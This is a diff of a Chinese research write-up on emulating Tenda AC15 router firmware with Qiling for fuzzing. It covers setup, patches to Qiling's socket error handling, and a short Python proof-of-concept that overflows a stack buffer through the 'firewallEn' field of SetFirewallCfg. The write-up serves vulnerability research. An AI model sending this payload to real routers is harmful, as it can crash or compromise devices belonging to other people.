@@ -144,16 +144,186 @@ AFL_AUTORESUME=1 AFL_PATH="$(realpath ./AFLplusplus)" PATH="$AFL_PATH:$PATH" afl
 ## 3.案例3：tenda-ac15
 tenda ac15的案例我无法直接运行起来，因此我先尝试对其进行模拟，然后找到一个已知漏洞验证是否能构正常触发，最后再构建模糊测试。
 ### 3.1 固件模拟
+#### 环境配置
+模拟的脚本为：[qiling/examples/tendaac1518_httpd.py](https://github.com/qilingframework/qiling/blob/dev/examples/tendaac1518_httpd.py)
+```python
+#!/usr/bin/env python3
+#
+# Cross Platform and Multi Architecture Advanced Binary Emulation Framework
+#
 
-但是在运行时，
+# Setup:
+# - Unpack firmware rootfs (assumed hereby: 'rootfs/tendaac15')
+#   - AC15 firmware may be acquired from https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip
+# - Refresh webroot directory:
+#   - Enter the 'squashfs-root' directory
+#   - rm -rf webroot
+#   - mv webroot_ro webroot
+# - Set network device
+#   - Open "qiling/profiles/linux.ql"
+#   - Set 'ifrname_override' to your hosting system network device name (e.g. eth0, lo, etc.)
+#
+# Run:
+#  $ PYTHONPATH=/path/to/qiling ROOTFS=/path/to/tenda_rootfs python3 tendaac1518_httpd.py
+
+import os
+import socket
+import threading
+
+import sys
+sys.path.append("..")
+
+from qiling import Qiling
+from qiling.const import QL_VERBOSE
+
+
+# user may set 'ROOTFS' environment variable to use as rootfs
+ROOTFS = os.environ.get('ROOTFS', r'./rootfs/tendaac15')
+
+
+def nvram_listener():
+    server_address = fr'{ROOTFS}/var/cfm_socket'
+
+    if os.path.exists(server_address):
+        os.unlink(server_address)
+
+    # Create UDS socket
+    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    sock.bind(server_address)
+    sock.listen(1)
+
+    data = bytearray()
+
+    with open('cfm_socket.log', 'wb') as ofile:
+        while True:
+            connection, _ = sock.accept()
+
+            try:
+                while True:
+                    data += connection.recv(1024)
+
+                    if b'lan.webiplansslen' not in data:
+                        break
+
+                    connection.send(b'192.168.170.169')
+
+                    ofile.write(data)
+                    data.clear()
+            finally:
+                connection.close()
+
+
+def my_sandbox(path, rootfs):
+    ql = Qiling(path, rootfs, verbose=QL_VERBOSE.DEBUG)
+    ql.add_fs_mapper(r'/dev/urandom', r'/dev/urandom')
+
+    # $ gdb-multiarch -q rootfs/tendaac15/bin/httpd
+    # gdb> set remotetimeout 100
+    # gdb> target remote localhost:9999
+
+    # if ql.debugger:
+    ql.run()
+
+
+if __name__ == '__main__':
+    nvram_listener_therad = threading.Thread(target=nvram_listener, daemon=True)
+    nvram_listener_therad.start()
+
+    my_sandbox([fr'{ROOTFS}/bin/httpd'], ROOTFS)
+```
+
+根据这个脚本最上面的说明操作：
+- 下载固件并解压：[US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip](https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip)
+- 利用binwalk解包固件，将squashfs-root改名为tendaac15并放入"rootfs"目录下
+- 进入文件系统，删除webroot目录，将webroot_ro改名为webroot
+
+网络服务我没用进行配置，我的环境是ubuntu 20.04，主机上有ens33网卡。
+
+尝试运行这个脚本，可以跑起来，它开起的端口是8080，可用`netstat -an | grep :80`命令查看。但是当我用浏览器访问（`http://127.0.0.1:8080`）时，在成功返回页面前，qiling终端就出现error了。经过多次测试，有时候它能成功返回页面或者几次点击后然后出现error，大多数情况点击一下在返回前就error，总之它不能稳定的运行，这很影响我们对固件的分析。
+
+出现的error有两种，大多数是`Syscall ERROR: ql_syscall_recv DEBUG: [Errno 11] Resource temporarily unavailable`，偶尔会出现`Syscall ERROR: ql_syscall_shutdown DEBUG: [Errno 107] Transport endpoint is not connected`。在网上查阅了资料无果，在qiling github页面上有人提出类似的[issue#1373](https://github.com/qilingframework/qiling/issues/1373)但无人解答。经过我的研究，对qiling的部分代码进行修改后解决了这两个问题，但是为了让我们能运行修改的qiling代码，我们需要先修改qiling的安装方式，如下：
+```
+wget https://github.com/qilingframework/qiling/archive/dev.zip
+unzip dev.zip
+cd qiling-dev
+pip install -e .
+```
+
+#### BlockingIOError: \[Errno 11] Resource temporarily unavailable
+运行报错如下：
+```bash
+[+] 	0x901ebf10: read(fd = 0x6, buf = 0x12c7f0, length = 0x800) = 0x294
+[+] 	Received interrupt: 0x2
+[+] 	0x90226eb8: send(sockfd = 0x4, buf = 0x1251a0, length = 0x303, flags = 0x0) = 0x0
+[+] 	Received interrupt: 0x2
+[+] 	read() CONTENT: b''
+[+] 	0x901ebf10: read(fd = 0x6, buf = 0x12c7f0, length = 0x800) = 0x0
+[+] 	Received interrupt: 0x2
+[+] 	close(6) = 0
+[+] 	0x901ea670: close(fd = 0x6) = 0x0
+[+] 	Received interrupt: 0x2
+[+] 	0x901ecd30: fcntl(fd = 0x4, cmd = 0x3, arg = 0x90) = 0x802
+[+] 	Received interrupt: 0x2
+[+] 	0x901ecd30: fcntl(fd = 0x4, cmd = 0x4, arg = 0x2) = 0x0
+[+] 	Received interrupt: 0x2
+[+] 	0x90226eb8: send(sockfd = 0x4, buf = 0x1251a0, length = 0x303, flags = 0x0) = 0x0
+[+] 	Received interrupt: 0x2
+[+] 	0x901ecd30: fcntl(fd = 0x4, cmd = 0x3, arg = 0x10) = 0x2
+[+] 	Received interrupt: 0x2
+[+] 	0x901ecd30: fcntl(fd = 0x4, cmd = 0x4, arg = 0x802) = 0x0
+[+] 	Received interrupt: 0x2
+[x] 	Syscall ERROR: ql_syscall_shutdown DEBUG: [Errno 107] Transport endpoint is not connected
+Traceback (most recent call last):
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/posix.py", line 213, in load_syscall
+    retval = syscall_hook(self.ql, *params)
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/syscall/socket.py", line 364, in ql_syscall_shutdown
+    sock.shutdown(how)
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/filestruct.py", line 80, in shutdown
+    return self.__socket.shutdown(how)
+OSError: [Errno 107] Transport endpoint is not connected
+Traceback (most recent call last):
+  File "tendaac1518_httpd.py", line 100, in <module>
+    my_sandbox([fr'{ROOTFS}/bin/httpd'], ROOTFS)
+  File "tendaac1518_httpd.py", line 93, in my_sandbox
+    ql.run()
+  File "/root/.local/lib/python3.8/site-packages/qiling/core.py", line 597, in run
+    self.os.run()
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/linux/linux.py", line 184, in run
+    self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)
+  File "/root/.local/lib/python3.8/site-packages/qiling/core.py", line 777, in emu_start
+    raise self.internal_exception
+  File "/root/.local/lib/python3.8/site-packages/qiling/core_hooks.py", line 127, in wrapper
+    return callback(*args, **kwargs)
+  File "/root/.local/lib/python3.8/site-packages/qiling/core_hooks.py", line 170, in _hook_intr_cb
+    ret = hook.call(ql, intno)
+  File "/root/.local/lib/python3.8/site-packages/qiling/core_hooks_types.py", line 25, in call
+    return self.callback(ql, *args)
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/linux/linux.py", line 138, in hook_syscall
+    return self.load_syscall()
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/posix.py", line 231, in load_syscall
+    raise e
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/posix.py", line 213, in load_syscall
+    retval = syscall_hook(self.ql, *params)
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/syscall/socket.py", line 364, in ql_syscall_shutdown
+    sock.shutdown(how)
+  File "/root/.local/lib/python3.8/site-packages/qiling/os/posix/filestruct.py", line 80, in shutdown
+    return self.__socket.shutdown(how)
+OSError: [Errno 107] Transport endpoint is not connected
+```
+在网上搜索这个错误，然后看到了一篇文章：
 
 [「非阻塞socket」报错 “BlockingIOError: [Errno 11]“ 复现以及分析解决_blockingioerror: [errno 11] resource temporarily u](https://blog.csdn.net/pythontide/article/details/109242386)
 
-[linux socket 错误 Transport endpoint is not connected 在 recv shutdown 中的触发时机_failed to reload daemon: transport endpoint is not](https://blog.csdn.net/whatday/article/details/104056667)
+![](images/Pasted%20image%2020231024221530.png)
 
-patch
+我的简单理解就是在模拟的过程中，因为某种情况，缓冲区的数据已经接受完了但仍然调用`recv()`然后就报错了，博客中作者通过给recv()加入try-except异常机制来解决这个错误。因此我也采用一样的思路，既然缓冲区数据已经读完，这条指令执行不成功应该也没有影响。我修改了qiling的代码，加入了try-except异常捕获机制，修改的代码位置位于qiling/os/posix/filestruct.py:116，修改前只有一个return语句。
+```python
+# qiling/os/posix/filestruct.py:116
+    def recv(self, bufsize: int, flags: int) -> bytes:
+        return self.__socket.recv(bufsize, flags)
+```
 
-对于BlockingIOError问题，我修改了qiling的代码，加入了try-except异常捕获机制，修改的代码位置位于qiling/os/posix/filestruct.py:116，修改如下：
+修后的代码如下：
 ```python
 # qiling/os/posix/filestruct.py:116
     def recv(self, bufsize: int, flags: int) -> bytes:
@@ -164,7 +334,14 @@ patch
             return b""
 ```
 
-对于`OSError: [Errno 107] Transport endpoint is not connected`问题，我修改了qiling的代码，加入了try-except异常捕获机制，修改的代码位置位于qiling/os/posix/filestruct.py:79，修改如下：
+#### OSError: \[Errno 107] Transport endpoint is not connected
+对于第二个错误，我在这篇文章看了它的说明，`客户端socket 已经关闭的情况，服务器端socket 调用shutdown 则会出现这个错误。`
+
+[linux socket 错误 Transport endpoint is not connected 在 recv shutdown 中的触发时机_failed to reload daemon: transport endpoint is not](https://blog.csdn.net/whatday/article/details/104056667)
+
+于是采用和上面一样的思路，采用try-except捕获异常处理，既然出现错误时套接字已经关闭了，那么这条指令调用不成功也没用什么影响。
+
+具体来说，我修改了qiling的代码，加入了try-except异常捕获机制，修改的代码位置位于qiling/os/posix/filestruct.py:79，修改前只有一条return语句，修改后的代码如下：
 ```python
 # qiling/os/posix/filestruct.py:79
     def shutdown(self, how: int) -> None:
@@ -175,10 +352,31 @@ patch
             return 0
 ```
 
+这时再运行刚开始的脚本，通过浏览器访问页面时就不会出现错误崩溃了。
 
-
+![](images/Pasted%20image%2020231024223049.png)
 
 ### 3.2 漏洞验证
+为了验证通过qiling模拟跑起来的程序是否能够触发漏洞，以及修改是否对漏洞触发有影响，我执行了这一步骤：通过一个已知的漏洞PoC进行验证，看程序是否会崩溃。
+
+我选择的PoC如下
+```python
+import requests
+
+host = 'http://127.0.0.1:8080'
+data = ("firewallEn="+'a'*0x51f).encode()
+
+session = requests.session()
+session.get(host)
+res = session.post(url = "http://127.0.0.1:8080/goform/SetFirewallCfg", data=data)
+print(res.text)
+```
+
+该漏洞位于对"goform/SetFirewallCfg"请求进行解析的函数"formSetFirewallCfg()"中，在49行获取请求数据中的`firewallEn`参数值并将其保存在`src`变量中，随后在53行在未验证字符串大小的情况下，通过`strcpy`危险函数将`src`直接拷贝给了栈上变量`dest`，从而造成栈溢出。
+
+![](images/Pasted%20image%2020231024223736.png)
+
+
 
 栈大小，超长字符串触发内存写错误，需要控制字符串长度不超过栈大小才能变为pc地址不可访问。
 
@@ -188,7 +386,8 @@ patch
 
 ![](images/Pasted%20image%2020231022220347.png)
 
-相关文章：
+## 4.关于qiling fuzz固件的相关文章
+在研究的过程中我收集了一些关于使用qiling对固件进行模糊测试的文章，目前能找到的相关文章的数量还是比较少的。
 
 [VinCSS Blog: [PT007] Simulating and hunting firmware vulnerabilities with Qiling](https://blog.vincss.net/2020/12/pt007-simulating-and-hunting-firmware-vulnerabilities-with-Qiling.html)
 
@@ -212,4 +411,4 @@ patch
 
 [Emulate_iot_programs_with_qiling_1 | JiansLife](https://www.jianslife.me/posts/emulate_iot_programs_with_qiling_1/)
 
-
+## 5.参考链接
